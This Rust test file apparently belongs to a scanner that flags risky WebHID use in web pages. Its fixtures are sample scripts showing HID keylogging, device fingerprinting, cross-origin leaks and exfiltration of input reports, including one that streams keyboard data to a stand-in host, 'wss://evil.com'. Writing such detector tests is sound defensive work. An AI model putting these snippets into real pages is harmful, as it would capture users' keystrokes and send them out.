use crate::webhid_audit::*;

#[test]
fn no_hid_no_issues() {
    assert!(analyze_webhid("<html><body>hello</body></html>").is_empty());
}

#[test]
fn detects_api_navigator() {
    let body = r#"<script>const devices = await navigator.hid.requestDevice({});</script>"#;
    let issues = analyze_webhid(body);
    assert!(issues.contains(&WebHidIssue::ApiDetected));
}

#[test]
fn detects_api_hid_device() {
    let body = r#"<script>const dev = new HIDDevice();</script>"#;
    let issues = analyze_webhid(body);
    assert!(issues.contains(&WebHidIssue::ApiDetected));
}

#[test]
fn detects_data_exfiltration() {
    let body = r#"<script>
        const devices = await navigator.hid.requestDevice({});
        fetch("/api/hid-data", {body: "data"});
    </script>"#;
    let issues = analyze_webhid(body);
    assert!(issues.contains(&WebHidIssue::DataExfiltration));
}

#[test]
fn no_exfil_without_fetch() {
    let body = r#"<script>
        const devices = await navigator.hid.requestDevice({});
        console.log(devices);
    </script>"#;
    let issues = analyze_webhid(body);
    assert!(!issues.contains(&WebHidIssue::DataExfiltration));
}

#[test]
fn detects_no_user_activation() {
    let body = r#"<script>await navigator.hid.requestDevice({});</script>"#;
    let issues = analyze_webhid(body);
    assert!(issues.contains(&WebHidIssue::NoUserActivation));
}

#[test]
fn no_activation_issue_with_click() {
    let body = r#"<script>
        btn.addEventListener("click", async () => {
            await navigator.hid.requestDevice({});
        });
    </script>"#;
    let issues = analyze_webhid(body);
    assert!(!issues.contains(&WebHidIssue::NoUserActivation));
}

#[test]
fn detects_raw_data_access() {
    let body = r#"<script>
        btn.addEventListener("click", async () => {
            const [dev] = await navigator.hid.requestDevice({});
            await dev.sendReport(0, new Uint8Array([0x01]));
        });
    </script>"#;
    let issues = analyze_webhid(body);
    assert!(issues.contains(&WebHidIssue::RawDataAccess));
}

#[test]
fn detects_device_enumeration() {
    let body = r#"<script>
        const devices = await navigator.hid.getDevices();
    </script>"#;
    let issues = analyze_webhid(body);
    assert!(issues.contains(&WebHidIssue::DeviceEnumeration));
}

#[test]
fn detects_persistent_connection() {
    let body = r#"<script>
        btn.addEventListener("click", async () => {
            const [dev] = await navigator.hid.requestDevice({});
            await dev.open();
            dev.oninputreport = (e) => console.log(e);
        });
    </script>"#;
    let issues = analyze_webhid(body);
    assert!(issues.contains(&WebHidIssue::PersistentConnection));
}

#[test]
fn severity_exfiltration_highest() {
    assert_eq!(webhid_severity(&WebHidIssue::DataExfiltration), 7.5);
}

#[test]
fn severity_detected_lowest() {
    assert_eq!(webhid_severity(&WebHidIssue::ApiDetected), 3.0);
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![WebHidIssue::ApiDetected, WebHidIssue::RawDataAccess];
    let mut seq = 0;
    let ops = webhid_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(WebHidIssue::ApiDetected.to_string(), "api_detected");
    assert_eq!(
        WebHidIssue::DataExfiltration.to_string(),
        "data_exfiltration"
    );
    assert_eq!(
        WebHidIssue::NoUserActivation.to_string(),
        "no_user_activation"
    );
    assert_eq!(WebHidIssue::RawDataAccess.to_string(), "raw_data_access");
    assert_eq!(
        WebHidIssue::DeviceEnumeration.to_string(),
        "device_enumeration"
    );
    assert_eq!(
        WebHidIssue::PersistentConnection.to_string(),
        "persistent_connection"
    );
}

#[test]
fn empty_body_no_issues() {
    assert!(analyze_webhid("").is_empty());
}

#[test]
fn security_no_hid_no_issues() {
    assert!(analyze_webhid_security("<html><body>hello</body></html>").is_empty());
}

#[test]
fn security_empty_body_no_issues() {
    assert!(analyze_webhid_security("").is_empty());
}

#[test]
fn detects_hid_device_enumeration() {
    let body = r#"<script>
        const devices = await navigator.hid.getDevices();
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(issues.contains(&WebHidSecurityIssue::HidDeviceEnumeration));
}

#[test]
fn detects_hid_keylogging_with_usage() {
    let body = r#"<script>
        const [dev] = await navigator.hid.requestDevice({
            filters: [{ usagePage: 1, usage: 6 }]
        });
        dev.oninputreport = (e) => console.log(e.data);
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(issues.contains(&WebHidSecurityIssue::HidKeylogging));
}

#[test]
fn detects_hid_keylogging_with_keyword() {
    let body = r#"<script>
        const [dev] = await navigator.hid.requestDevice({
            filters: [{ usagePage: 1, usage: 'keyboard' }]
        });
        await dev.receiveFeatureReport(0);
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(issues.contains(&WebHidSecurityIssue::HidKeylogging));
}

#[test]
fn no_keylogging_without_keyboard_usage() {
    let body = r#"<script>
        const [dev] = await navigator.hid.requestDevice({
            filters: [{ usagePage: 3, usage: 4 }]
        });
        dev.oninputreport = (e) => console.log(e.data);
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(!issues.contains(&WebHidSecurityIssue::HidKeylogging));
}

#[test]
fn detects_hid_without_permission() {
    let body = r#"<script>
        await navigator.hid.requestDevice({});
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(issues.contains(&WebHidSecurityIssue::HidWithoutPermission));
}

#[test]
fn no_permission_issue_with_click() {
    let body = r#"<script>
        btn.addEventListener("click", async () => {
            await navigator.hid.requestDevice({});
        });
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(!issues.contains(&WebHidSecurityIssue::HidWithoutPermission));
}

#[test]
fn no_permission_issue_with_keydown() {
    let body = r#"<script>
        document.addEventListener("keydown", async (e) => {
            if (e.key === 'h') await navigator.hid.requestDevice({});
        });
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(!issues.contains(&WebHidSecurityIssue::HidWithoutPermission));
}

#[test]
fn no_permission_issue_with_pointerdown() {
    let body = r#"<script>
        btn.addEventListener("pointerdown", async () => {
            await navigator.hid.requestDevice({});
        });
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(!issues.contains(&WebHidSecurityIssue::HidWithoutPermission));
}

#[test]
fn detects_hid_data_exfiltration_fetch() {
    let body = r#"<script>
        const [dev] = await navigator.hid.requestDevice({});
        dev.oninputreport = async (e) => {
            await fetch("/api/hid", { method: "POST", body: e.data });
        };
        await dev.sendReport(0, new Uint8Array([1, 2, 3]));
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(issues.contains(&WebHidSecurityIssue::HidDataExfiltration));
}

#[test]
fn detects_hid_data_exfiltration_beacon() {
    let body = r#"<script>
        const [dev] = await navigator.hid.requestDevice({});
        const report = await dev.receiveFeatureReport(0);
        navigator.sendBeacon("/api/hid", report.buffer);
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(issues.contains(&WebHidSecurityIssue::HidDataExfiltration));
}

#[test]
fn detects_hid_data_exfiltration_websocket() {
    let body = r#"<script>
        const ws = new WebSocket("wss://evil.com");
        const [dev] = await navigator.hid.requestDevice({});
        dev.oninputreport = (e) => ws.send(e.data);
        await dev.sendReport(0, new Uint8Array([1]));
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(issues.contains(&WebHidSecurityIssue::HidDataExfiltration));
}

#[test]
fn no_exfiltration_without_network() {
    let body = r#"<script>
        const [dev] = await navigator.hid.requestDevice({});
        await dev.sendReport(0, new Uint8Array([1]));
        console.log("sent");
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(!issues.contains(&WebHidSecurityIssue::HidDataExfiltration));
}

#[test]
fn detects_hid_device_fingerprinting_with_length() {
    let body = r#"<script>
        const devices = await navigator.hid.getDevices();
        if (devices.length > 0) {
            console.log("Has HID devices");
        }
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(issues.contains(&WebHidSecurityIssue::HidDeviceFingerprinting));
}

#[test]
fn detects_hid_device_fingerprinting_vendor_product() {
    let body = r#"<script>
        const [dev] = await navigator.hid.requestDevice({});
        const fingerprint = `${dev.vendorId}:${dev.productId}`;
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(issues.contains(&WebHidSecurityIssue::HidDeviceFingerprinting));
}

#[test]
fn detects_hid_device_fingerprinting_map() {
    let body = r#"<script>
        const devices = await navigator.hid.getDevices().then(d => d.map(x => x.productName));
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(issues.contains(&WebHidSecurityIssue::HidDeviceFingerprinting));
}

#[test]
fn no_fingerprinting_without_device_inspection() {
    let body = r#"<script>
        const devices = await navigator.hid.getDevices();
        console.log("got devices");
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(!issues.contains(&WebHidSecurityIssue::HidDeviceFingerprinting));
}

#[test]
fn detects_hid_output_report() {
    let body = r#"<script>
        const [dev] = await navigator.hid.requestDevice({});
        await dev.open();
        await dev.sendReport(0, new Uint8Array([0x01, 0x02]));
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(issues.contains(&WebHidSecurityIssue::HidOutputReport));
}

#[test]
fn detects_hid_feature_report_send() {
    let body = r#"<script>
        const [dev] = await navigator.hid.requestDevice({});
        await dev.sendFeatureReport(0, new Uint8Array([0x01]));
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(issues.contains(&WebHidSecurityIssue::HidFeatureReport));
}

#[test]
fn detects_hid_feature_report_receive() {
    let body = r#"<script>
        const [dev] = await navigator.hid.requestDevice({});
        const report = await dev.receiveFeatureReport(0);
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(issues.contains(&WebHidSecurityIssue::HidFeatureReport));
}

#[test]
fn detects_hid_cross_origin_postmessage() {
    let body = r#"<script>
        const devices = await navigator.hid.getDevices();
        window.parent.postMessage({ devices }, "*");
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(issues.contains(&WebHidSecurityIssue::HidCrossOrigin));
}

#[test]
fn detects_hid_cross_origin_iframe() {
    let body = r#"<script>
        const devices = await navigator.hid.getDevices();
        const iframe = document.querySelector("iframe");
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(issues.contains(&WebHidSecurityIssue::HidCrossOrigin));
}

#[test]
fn detects_hid_cross_origin_opener() {
    let body = r#"<script>
        const devices = await navigator.hid.getDevices();
        if (window.opener) {
            window.opener.postMessage(devices, "*");
        }
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(issues.contains(&WebHidSecurityIssue::HidCrossOrigin));
}

#[test]
fn no_cross_origin_without_messaging() {
    let body = r#"<script>
        const devices = await navigator.hid.getDevices();
        console.log(devices);
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(!issues.contains(&WebHidSecurityIssue::HidCrossOrigin));
}

#[test]
fn detects_hid_persistent_connection_oninputreport() {
    let body = r#"<script>
        const [dev] = await navigator.hid.requestDevice({});
        await dev.open();
        dev.oninputreport = (e) => console.log(e.data);
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(issues.contains(&WebHidSecurityIssue::HidPersistentConnection));
}

#[test]
fn detects_hid_persistent_connection_event_listener() {
    let body = r#"<script>
        const [dev] = await navigator.hid.requestDevice({});
        await dev.open();
        dev.addEventListener("inputreport", (e) => console.log(e.data));
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(issues.contains(&WebHidSecurityIssue::HidPersistentConnection));
}

#[test]
fn detects_hid_in_background_visibilitychange() {
    let body = r#"<script>
        document.addEventListener("visibilitychange", async () => {
            const devices = await navigator.hid.getDevices();
        });
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(issues.contains(&WebHidSecurityIssue::HidInBackground));
}

#[test]
fn detects_hid_in_background_hidden_check() {
    let body = r#"<script>
        if (document.hidden) {
            await navigator.hid.requestDevice({});
        }
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(issues.contains(&WebHidSecurityIssue::HidInBackground));
}

#[test]
fn detects_hid_in_background_visibility_state() {
    let body = r#"<script>
        if (document.visibilityState === "hidden") {
            const devices = await navigator.hid.getDevices();
        }
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(issues.contains(&WebHidSecurityIssue::HidInBackground));
}

#[test]
fn no_background_issue_without_visibility_check() {
    let body = r#"<script>
        const devices = await navigator.hid.getDevices();
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(!issues.contains(&WebHidSecurityIssue::HidInBackground));
}

#[test]
fn security_severity_keylogging_highest() {
    assert_eq!(
        webhid_security_severity(&WebHidSecurityIssue::HidKeylogging),
        9.0
    );
}

#[test]
fn security_severity_data_exfiltration_high() {
    assert_eq!(
        webhid_security_severity(&WebHidSecurityIssue::HidDataExfiltration),
        8.5
    );
}

#[test]
fn security_severity_without_permission_high() {
    assert_eq!(
        webhid_security_severity(&WebHidSecurityIssue::HidWithoutPermission),
        7.5
    );
}

#[test]
fn security_severity_output_report_medium_high() {
    assert_eq!(
        webhid_security_severity(&WebHidSecurityIssue::HidOutputReport),
        7.0
    );
}

#[test]
fn security_severity_feature_report_medium() {
    assert_eq!(
        webhid_security_severity(&WebHidSecurityIssue::HidFeatureReport),
        6.5
    );
}

#[test]
fn security_severity_fingerprinting_medium() {
    assert_eq!(
        webhid_security_severity(&WebHidSecurityIssue::HidDeviceFingerprinting),
        6.0
    );
}

#[test]
fn security_severity_cross_origin_medium_low() {
    assert_eq!(
        webhid_security_severity(&WebHidSecurityIssue::HidCrossOrigin),
        5.5
    );
}

#[test]
fn security_severity_background_low() {
    assert_eq!(
        webhid_security_severity(&WebHidSecurityIssue::HidInBackground),
        5.0
    );
}

#[test]
fn security_severity_persistent_connection_low() {
    assert_eq!(
        webhid_security_severity(&WebHidSecurityIssue::HidPersistentConnection),
        4.5
    );
}

#[test]
fn security_severity_enumeration_lowest() {
    assert_eq!(
        webhid_security_severity(&WebHidSecurityIssue::HidDeviceEnumeration),
        4.0
    );
}

#[test]
fn security_to_operations_creates_entries() {
    let issues = vec![
        WebHidSecurityIssue::HidKeylogging,
        WebHidSecurityIssue::HidDataExfiltration,
    ];
    let mut seq = 0;
    let ops = webhid_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn security_to_operations_increments_sequence() {
    let issues = vec![
        WebHidSecurityIssue::HidDeviceEnumeration,
        WebHidSecurityIssue::HidOutputReport,
        WebHidSecurityIssue::HidFeatureReport,
    ];
    let mut seq = 5;
    let ops = webhid_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 3);
    assert_eq!(seq, 8);
}

#[test]
fn security_display_hid_device_enumeration() {
    assert_eq!(
        WebHidSecurityIssue::HidDeviceEnumeration.to_string(),
        "hid_device_enumeration"
    );
}

#[test]
fn security_display_hid_keylogging() {
    assert_eq!(
        WebHidSecurityIssue::HidKeylogging.to_string(),
        "hid_keylogging"
    );
}

#[test]
fn security_display_hid_without_permission() {
    assert_eq!(
        WebHidSecurityIssue::HidWithoutPermission.to_string(),
        "hid_without_permission"
    );
}

#[test]
fn security_display_hid_data_exfiltration() {
    assert_eq!(
        WebHidSecurityIssue::HidDataExfiltration.to_string(),
        "hid_data_exfiltration"
    );
}

#[test]
fn security_display_hid_device_fingerprinting() {
    assert_eq!(
        WebHidSecurityIssue::HidDeviceFingerprinting.to_string(),
        "hid_device_fingerprinting"
    );
}

#[test]
fn security_display_hid_output_report() {
    assert_eq!(
        WebHidSecurityIssue::HidOutputReport.to_string(),
        "hid_output_report"
    );
}

#[test]
fn security_display_hid_feature_report() {
    assert_eq!(
        WebHidSecurityIssue::HidFeatureReport.to_string(),
        "hid_feature_report"
    );
}

#[test]
fn security_display_hid_cross_origin() {
    assert_eq!(
        WebHidSecurityIssue::HidCrossOrigin.to_string(),
        "hid_cross_origin"
    );
}

#[test]
fn security_display_hid_persistent_connection() {
    assert_eq!(
        WebHidSecurityIssue::HidPersistentConnection.to_string(),
        "hid_persistent_connection"
    );
}

#[test]
fn security_display_hid_in_background() {
    assert_eq!(
        WebHidSecurityIssue::HidInBackground.to_string(),
        "hid_in_background"
    );
}

#[test]
fn multiple_security_issues_detected() {
    let body = r#"<script>
        const devices = await navigator.hid.getDevices();
        const [dev] = await navigator.hid.requestDevice({
            filters: [{ usagePage: 1, usage: 6 }]
        });
        await dev.open();
        dev.oninputreport = async (e) => {
            await fetch("/api/hid", { method: "POST", body: e.data });
        };
        await dev.sendReport(0, new Uint8Array([1]));
    </script>"#;
    let issues = analyze_webhid_security(body);
    assert!(issues.len() >= 4);
    assert!(issues.contains(&WebHidSecurityIssue::HidDeviceEnumeration));
    assert!(issues.contains(&WebHidSecurityIssue::HidKeylogging));
    assert!(issues.contains(&WebHidSecurityIssue::HidDataExfiltration));
    assert!(issues.contains(&WebHidSecurityIssue::HidPersistentConnection));
}
